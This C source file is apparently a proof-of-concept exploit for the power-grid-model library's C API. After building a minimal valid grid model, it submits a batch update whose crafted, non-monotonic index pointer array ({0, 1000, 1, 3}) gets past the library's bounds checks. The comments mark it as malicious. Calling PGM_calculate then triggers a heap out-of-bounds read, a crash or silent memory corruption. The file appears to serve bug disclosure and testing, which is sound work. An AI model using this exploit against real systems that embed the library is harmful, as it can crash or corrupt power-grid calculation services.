#include "power_grid_model_c.h"
#include "power_grid_model_c/dataset_definitions.h"

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

int main(void) {

    PGM_Handle* handle = PGM_create_handle();

    /* ------------------------------------------------------------------ */
    /* Build a minimal valid input: 1 node + 1 source + 1 sym_load        */
    /* ------------------------------------------------------------------ */

    void* node_input   = PGM_create_buffer(handle, PGM_def_input_node,     1);
    void* source_input = PGM_create_buffer(handle, PGM_def_input_source,   1);
    void* load_input   = PGM_create_buffer(handle, PGM_def_input_sym_load, 1);

    PGM_buffer_set_nan(handle, PGM_def_input_node,     node_input,   0, 1);
    PGM_buffer_set_nan(handle, PGM_def_input_source,   source_input, 0, 1);
    PGM_buffer_set_nan(handle, PGM_def_input_sym_load, load_input,   0, 1);

    /* Node 1 @ 10.5 kV */
    PGM_ID node_id  = 1;
    double u_rated  = 10500.0;
    PGM_buffer_set_value(handle, PGM_def_input_node_id,      node_input, &node_id, 0, 1, -1);
    PGM_buffer_set_value(handle, PGM_def_input_node_u_rated, node_input, &u_rated, 0, 1, -1);

    /* Source 0 @ node 1, u_ref=1.0, sk=1 MVA */
    PGM_ID  source_id = 0;
    PGM_ID  src_node  = 1;
    int8_t  status    = 1;
    double  u_ref     = 1.0;
    double  sk        = 1e6;
    PGM_buffer_set_value(handle, PGM_def_input_source_id,     source_input, &source_id, 0, 1, -1);
    PGM_buffer_set_value(handle, PGM_def_input_source_node,   source_input, &src_node,  0, 1, -1);
    PGM_buffer_set_value(handle, PGM_def_input_source_status, source_input, &status,    0, 1, -1);
    PGM_buffer_set_value(handle, PGM_def_input_source_u_ref,  source_input, &u_ref,     0, 1, -1);
    PGM_buffer_set_value(handle, PGM_def_input_source_sk,     source_input, &sk,        0, 1, -1);

    /* sym_load 2 @ node 1, const-power, 100 kW */
    PGM_ID  load_id   = 2;
    PGM_ID  load_node = 1;
    int8_t  load_type = 0;   /* const power */
    double  p_spec    = 100e3;
    double  q_spec    = 0.0;
    PGM_buffer_set_value(handle, PGM_def_input_sym_load_id,          load_input, &load_id,   0, 1, -1);
    PGM_buffer_set_value(handle, PGM_def_input_sym_load_node,        load_input, &load_node, 0, 1, -1);
    PGM_buffer_set_value(handle, PGM_def_input_sym_load_status,      load_input, &status,    0, 1, -1);
    PGM_buffer_set_value(handle, PGM_def_input_sym_load_type,        load_input, &load_type, 0, 1, -1);
    PGM_buffer_set_value(handle, PGM_def_input_sym_load_p_specified, load_input, &p_spec,    0, 1, -1);
    PGM_buffer_set_value(handle, PGM_def_input_sym_load_q_specified, load_input, &q_spec,    0, 1, -1);

    PGM_ConstDataset* input_dataset = PGM_create_dataset_const(handle, "input", 0, 1);
    PGM_dataset_const_add_buffer(handle, input_dataset, "node",     1, 1, NULL, node_input);
    PGM_dataset_const_add_buffer(handle, input_dataset, "source",   1, 1, NULL, source_input);
    PGM_dataset_const_add_buffer(handle, input_dataset, "sym_load", 1, 1, NULL, load_input);

    if (PGM_error_code(handle) != PGM_no_error) {
        printf("[!] Error building input dataset: %s\n", PGM_error_message(handle));
        return 1;
    }

    PGM_PowerGridModel* model = PGM_create_model(handle, 50.0, input_dataset);
    if (PGM_error_code(handle) != PGM_no_error) {
        printf("[!] Error creating model: %s\n", PGM_error_message(handle));
        return 1;
    }
    printf("[+] Model created (1 node, 1 source, 1 sym_load)\n");

    /* ------------------------------------------------------------------ */
    /* Output dataset: 3 scenarios, 1 node result each                    */
    /* ------------------------------------------------------------------ */

    void* node_output = PGM_create_buffer(handle, PGM_def_sym_output_node, 3);
    PGM_MutableDataset* output_dataset = PGM_create_dataset_mutable(handle, "sym_output", 1, 3);
    PGM_dataset_mutable_add_buffer(handle, output_dataset, "node", 1, 3, NULL, node_output);

    /* ------------------------------------------------------------------ */
    /* Malicious batch update: crafted non-monotonic indptr               */
    /* ------------------------------------------------------------------ */

    /*
     * Allocate 3 sym_load update entries (total_elements = 3).
     * indptr = {0, 1000, 1, 3}:
     *   indptr[0] = 0     checks pass: == 0
     *   indptr[3] = 3     checks pass: == total_elements
     *   indptr[1] = 1000  NON-MONOTONIC -> scenario 0 span covers elements
     *                     [0 .. 1000), but the buffer only has 3 entries.
     */
    void* load_update = PGM_create_buffer(handle, PGM_def_update_sym_load, 3);
    PGM_buffer_set_nan(handle, PGM_def_update_sym_load, load_update, 0, 3);

    PGM_ID update_ids[3]  = {2,    2,    2};
    double p_updates[3]   = {50e3, 75e3, 125e3};
    PGM_buffer_set_value(handle, PGM_def_update_sym_load_id,          load_update, update_ids, 0, 3, -1);
    PGM_buffer_set_value(handle, PGM_def_update_sym_load_p_specified, load_update, p_updates,  0, 3, -1);

    /* THE CRAFTED INDPTR */
    PGM_Idx indptr[4] = {0, 1000, 1, 3};

    printf("[+] Crafted indptr: {%ld, %ld, %ld, %ld}\n",
           (long)indptr[0], (long)indptr[1], (long)indptr[2], (long)indptr[3]);

    PGM_ConstDataset* update_dataset = PGM_create_dataset_const(handle, "update", 1, 3);
    PGM_dataset_const_add_buffer(handle, update_dataset, "sym_load",
                                 -1,      /* elements_per_scenario = -1 -> non-uniform */
                                 3,       /* total_elements = 3 (only 3 entries allocated) */
                                 indptr,  /* MALICIOUS: non-monotonic */
                                 load_update);

    if (PGM_error_code(handle) != PGM_no_error) {
        printf("[!] add_buffer rejected the indptr: %s\n", PGM_error_message(handle));
        printf("    (monotonicity check may have been added as a fix)\n");
        return 1;
    }
    printf("[+] add_buffer accepted indptr without monotonicity check\n");

    /* ------------------------------------------------------------------ */
    /* Trigger OOB: PGM_calculate applies the batch update                */
    /* ------------------------------------------------------------------ */

    PGM_Options* opt = PGM_create_options(handle);

    printf("[+] Calling PGM_calculate ...\n");
    printf("    Expected: heap-buffer-overflow (ASAN) or SIGSEGV (no ASAN)\n");
    fflush(stdout);

    PGM_calculate(handle, model, opt, output_dataset, update_dataset);

    /*
     * Reaching this point means the OOB was silently swallowed — either
     * the OS did not fault on the overread, or PGM_calculate returned an
     * error before the span was consumed.  Re-run with ASAN to confirm.
     */
    if (PGM_error_code(handle) != PGM_no_error) {
        printf("[-] PGM_calculate returned an error (no crash): %s\n",
               PGM_error_message(handle));
        printf("    The OOB may still have occurred; run with ASAN to confirm.\n");
    } else {
        printf("[-] PGM_calculate returned PGM_no_error.\n");
        printf("    Silent OOB corruption likely occurred. Run with ASAN.\n");
    }

    /* ---- Cleanup ---- */
    PGM_destroy_options(opt);
    PGM_destroy_dataset_const(update_dataset);
    PGM_destroy_buffer(load_update);
    PGM_destroy_dataset_mutable(output_dataset);
    PGM_destroy_buffer(node_output);
    PGM_destroy_model(model);
    PGM_destroy_dataset_const(input_dataset);
    PGM_destroy_buffer(load_input);
    PGM_destroy_buffer(source_input);
    PGM_destroy_buffer(node_input);
    PGM_destroy_handle(handle);

    return 0;
}
